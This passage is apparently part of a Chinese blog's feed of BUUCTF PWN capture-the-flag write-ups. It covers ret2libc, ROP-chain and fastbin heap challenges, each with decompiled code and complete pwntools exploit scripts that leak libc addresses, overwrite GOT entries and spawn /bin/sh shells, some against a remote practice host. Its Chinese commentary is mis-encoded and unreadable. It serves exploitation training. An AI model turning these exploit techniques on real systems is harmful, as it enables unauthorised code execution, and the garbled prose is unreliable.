p64(free_got) + p64(puts_got)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">4</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x30-jarvisoj-level1&quot;&gt;&lt;a href=&quot;#0x30-jarvisoj-level1&quot; class=&quot;headerlink&quot; title=&quot;0x30.jarvisoj_level1&quot;&gt;&lt;/a&gt;0x30.jarvisoj</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWNåˆ·é¢˜_0x21-0x2F</title>
    <link href="http://example.com/2021/07/11/BUU-PWN-0x20-0x2F/"/>
    <id>http://example.com/2021/07/11/BUU-PWN-0x20-0x2F/</id>
    <published>2021-07-10T16:00:00.000Z</published>
    <updated>2021-07-20T12:46:13.586Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="0x20-jarvisoj-level3-x64"><a href="#0x20-jarvisoj-level3-x64" class="headerlink" title="0x20.jarvisoj_level3_x64"></a>0x20.jarvisoj_level3_x64</h2><p>ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3_x64&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29779</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)+ p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) +p64(read_got)+p64(<span class="number">8</span>)+p64(write_plt)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_add = u64(io.recv()[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_add)</span><br><span class="line">base = read_add - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">sys_add = base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_add)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x21-picoctf-2018-rop-chain"><a href="#0x21-picoctf-2018-rop-chain" class="headerlink" title="0x21.picoctf_2018_rop chain"></a>0x21.picoctf_2018_rop chain</h2><p>win1():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win_function1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  win1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>win2():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">win_function2</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)win1;</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; a1 == <span class="number">0xBAAAAAAD</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    win2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( win1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong Argument. Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Nope. Try a little bit harder.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">0xDEADBAAD</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( win1 || win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ ROPé“¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./PicoCTF_2018_rop_chain&quot;</span>)</span><br><span class="line">win1 = <span class="number">0x80485CB</span></span><br><span class="line">win2 = <span class="number">0x80485D8</span></span><br><span class="line">flag = <span class="number">0x804862B</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(win1) + p32(win2)+ p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) +p32(<span class="number">0xDEADBAAD</span>) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x22-ZJCTF-2019-EasyHeap"><a href="#0x22-ZJCTF-2019-EasyHeap" class="headerlink" title="0x22.[ZJCTF 2019]EasyHeap"></a>0x22.[ZJCTF 2019]EasyHeap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>creatæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯editæœ‰é—®é¢˜ï¼Œå¯ä»¥é‡æ–°å†™ä»»æ„é•¿åº¦ã€‚</p><p>deleteåœ¨freeåç›¸åº”çš„heaparrayå°±ç½®ä½0ã€‚</p><p>å¤§è‡´æ€è·¯æ˜¯è¿™æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)<span class="comment">#idx0</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)<span class="comment">#idx1</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)<span class="comment">#idx2  é˜²æ­¢ä¸top chunkåˆå¹¶</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">io.interactive(<span class="built_in">str</span>(<span class="number">4869</span>))</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¾ˆå¯æƒœï¼Œbuuä»–æ²¡æœ‰/home/pwn/flagè¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å¾—ç”¨å…¶ä»–çš„æ–¹æ³•äº†ã€‚</p><p>å¦ä¸€ä¸ªæ€è·¯ï¼š</p><ul><li>  é¦–å…ˆcreate 3ä¸ªchunk</li><li>  ä½¿ç”¨house of sprite æŠ€æœ¯ï¼Œä¼ªé€ chunkåˆ°heaparrayé™„è¿‘ï¼Œæ‰¾ä¸€ä¸ªåœ°å€å¼€å¤´ä¸º7fçš„æ¥ä¼ªé€ ç›¸åº”å¤§å°çš„fastbin</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32xw 0x6020a0 -3</span><br><span class="line">0x60209d:0x200000000x05212e060x0000007f0x00000000</span><br><span class="line">0x6020ad:0xe00000000x05212df80x0000007f0x00000000</span><br><span class="line">0x6020bd:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x6020cd:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x6020dd:0x100000000x0000db500x300000000x0000db50</span><br><span class="line">0x6020ed &lt;heaparray+13&gt;:0x500000000x0000db500x700000000x0000db50</span><br><span class="line">0x6020fd &lt;heaparray+29&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x60210d &lt;heaparray+45&gt;:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure><ul><li>  åœ¨chunk1å†™å…¥/bin/shï¼Œfreeæ‰chunk2</li><li>  edit chunk1ï¼Œå¹¶ä¿®æ”¹chunk2çš„fdä¸º0x6020b0 -3</li><li>  ä¹‹åmallocä¸¤æ¬¡ï¼Œå¹¶ä¿®æ”¹heaparrayä¸ºfree_got.</li><li>  ç»§ç»­ecit0ï¼Œå°†free_gotæ”¹ä¸ºsystem</li><li>  å†ä¹‹ådelete chunk1å°±èƒ½æ‹¿åˆ°shell</li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./easyheap&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26600</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_heap</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_heap</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">heaparray = <span class="number">0x6020b0</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sys = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">creat_heap(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&quot;a&quot;</span>*<span class="number">10</span>)<span class="comment">#idx0</span></span><br><span class="line">creat_heap(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">&quot;b&quot;</span>*<span class="number">10</span>)<span class="comment">#idx1</span></span><br><span class="line">creat_heap(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">&quot;c&quot;</span>*<span class="number">10</span>)<span class="comment">#idx2</span></span><br><span class="line">delete_heap(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0</span>)*<span class="number">12</span> + p64(<span class="number">0x71</span>) +p64(heaparray - <span class="number">3</span>)</span><br><span class="line">edit_heap(<span class="number">1</span>,size(payload),payload)</span><br><span class="line">payload = <span class="string">&quot;\xaa&quot;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">4</span> + p64(free_got)</span><br><span class="line">creat_heap(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&quot;aaa&quot;</span>)<span class="comment">#idx2</span></span><br><span class="line">creat_heap(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#fake_chunk</span></span><br><span class="line">edit_heap(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit_heap(<span class="number">0</span>,<span class="built_in">len</span>(p64(sys)),p64(sys))</span><br><span class="line">delete_heap(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x23-bjdctf-2020-babyrop2"><a href="#0x23-bjdctf-2020-babyrop2" class="headerlink" title="0x23.bjdctf_2020_babyrop2"></a>0x23.bjdctf_2020_babyrop2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec bjdctf_2020_babyrop2 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/bjdctf_2020_babyrop2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>å¼€äº†å¯¹æˆ˜ä¸å¯æ‰§è¡Œå’Œcanaryã€‚</p><p>ä¸»å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  gift(argc, argv);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can u return to libc ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try u best!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%6s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400A05);</span><br><span class="line">  fflush(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  